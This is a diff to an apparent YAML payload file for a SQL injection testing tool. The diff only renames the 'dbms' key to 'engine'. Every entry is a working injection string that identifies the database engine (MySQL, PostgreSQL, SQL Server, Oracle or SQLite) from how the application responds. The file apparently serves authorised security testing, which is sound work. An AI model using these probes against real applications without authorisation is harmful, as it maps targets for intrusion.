@@ -11,62 +11,62 @@ credits:
   - "Discriminator selection informed by published vendor documentation and PortSwigger's SQL injection cheat sheet; entries are written for this project."
 entries:
   - name: string concatenation with double pipe
-    dbms: [postgresql, oracle, sqlite]
+    engine: [postgresql, oracle, sqlite]
     payload: "' || 'a' = 'a"
     detect: "Baseline-identical response. Narrows to PostgreSQL, Oracle or SQLite; MySQL treats double pipe as logical OR by default."
 
   - name: string concatenation with plus
-    dbms: [mssql]
+    engine: [mssql]
     payload: "' + 'a' = 'a"
     detect: "Baseline-identical only on SQL Server, where plus concatenates strings."
 
   - name: string concatenation by juxtaposition
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' 'a' = 'a"
     detect: "Baseline-identical on MySQL, which concatenates adjacent string literals."
 
   - name: version constant (MySQL)
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' AND @@version LIKE '%"
     detect: "Baseline-identical only where the @@version session variable exists."
 
   - name: version constant (PostgreSQL)
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "' AND version() LIKE '%"
     detect: "Baseline-identical only where version() is callable without a FROM clause."
 
   - name: version constant (SQL Server)
-    dbms: [mssql]
+    engine: [mssql]
     payload: "' AND @@version LIKE '%"
     detect: "Shares syntax with MySQL; pair with the plus-concatenation result to separate the two."
 
   - name: version table (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL AND 'a'='a"
     detect: "Oracle requires a FROM clause on every SELECT, which is itself the discriminator."
 
   - name: dual table probe (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND (SELECT 1 FROM dual) = 1 AND 'a'='a"
     detect: "The dual pseudo-table exists on Oracle only."
 
   - name: sqlite_version (SQLite)
-    dbms: [sqlite]
+    engine: [sqlite]
     payload: "' AND sqlite_version() LIKE '%"
     detect: "Function exists on SQLite only."
 
   - name: sqlite_master presence (SQLite)
-    dbms: [sqlite]
+    engine: [sqlite]
     payload: "' AND (SELECT count(*) FROM sqlite_master) >= 0 AND 'a'='a"
     detect: "The sqlite_master catalogue table exists on SQLite only."
 
   - name: inline comment terminator (MySQL, SQL Server)
-    dbms: [mysql, mssql]
+    engine: [mysql, mssql]
     payload: "' AND 'a'='a'-- "
     detect: "Double-dash requires a trailing space on MySQL; its presence or absence separates MySQL from SQL Server, which does not."
     note: "The trailing space is significant and is easily lost when copying. Verify it survived into the request."
 
   - name: hash comment terminator (MySQL)
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' AND 'a'='a'#"
     detect: "Hash comments are MySQL-specific and need no trailing space."
